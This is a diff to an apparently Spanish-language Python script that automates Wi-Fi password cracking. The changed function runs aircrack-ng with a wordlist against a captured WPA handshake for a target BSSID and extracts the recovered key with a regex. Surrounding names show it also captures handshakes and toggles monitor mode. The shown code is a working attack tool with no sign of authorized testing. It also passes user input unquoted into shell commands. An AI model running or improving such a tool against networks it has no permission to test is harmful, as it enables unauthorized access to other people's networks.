@@ -242,40 +242,41 @@ def capture_handshake(monitor_interface, bssid, channel, essid, output_file):
 def crack_password(cap_file, bssid, wordlist):
     """Intenta crackear la contraseña usando un diccionario"""
     print_step(4, "Iniciando Ataque de Fuerza Bruta")
-    
+
     if not os.path.exists(wordlist):
         print_error(f"El diccionario no existe: {wordlist}")
         return None
-    
+
     # Contar líneas del diccionario
     count_result = run_command(f"wc -l {wordlist}")
     if count_result:
         word_count = count_result.stdout.split()[0]
         print_info(f"Diccionario: {wordlist} ({word_count} contraseñas)")
-    
+
     print_info(f"Archivo de captura: {cap_file}")
     print_info(f"BSSID objetivo: {bssid}")
     print_info("Este proceso puede tomar desde segundos hasta horas...")
     print()
-    
-    # Ejecutar aircrack-ng
+
+    # Ejecutar aircrack-ng y capturar salida
     crack_cmd = f"aircrack-ng -w {wordlist} -b {bssid} {cap_file}"
-    
+
     print(f"{Colors.CYAN}Probando contraseñas...{Colors.END}\n")
-    
-    result = run_command(crack_cmd, capture=False)
-    
+
+    result = subprocess.run(crack_cmd, shell=True, capture_output=True, text=True)
+
+    # Mostrar output
+    print(result.stdout)
+    if result.stderr:
+        print(result.stderr)
+
     # Buscar la contraseña en la salida
-    if result and result.returncode == 0:
-        # Leer el archivo de captura nuevamente para extraer la clave
-        verify_result = run_command(f"aircrack-ng -w {wordlist} -b {bssid} {cap_file}")
-        if verify_result and 'KEY FOUND' in verify_result.stdout:
-            # Extraer la contraseña
-            match = re.search(r'KEY FOUND! \[ (.+?) \]', verify_result.stdout)
-            if match:
-                password = match.group(1)
-                return password
-    
+    if 'KEY FOUND' in result.stdout:
+        match = re.search(r'KEY FOUND! \[ (.+?) \]', result.stdout)
+        if match:
+            password = match.group(1)
+            return password
+
     return None
 
 def disable_monitor_mode(monitor_interface):
@@ -379,7 +380,7 @@ def main():
         if default_wordlist:
             print_info(f"\nDiccionario por defecto encontrado: {default_wordlist}")
             use_default = input(f"{Colors.YELLOW}¿Usar este diccionario? (si/no)\n>>> {Colors.END}").lower()
-            if use_default == 'si':
+            if use_default in ['si', 's', 'yes', 'y']:
                 wordlist = default_wordlist
             else:
                 wordlist = input(f"{Colors.YELLOW}Ruta al diccionario personalizado\n>>> {Colors.END}")
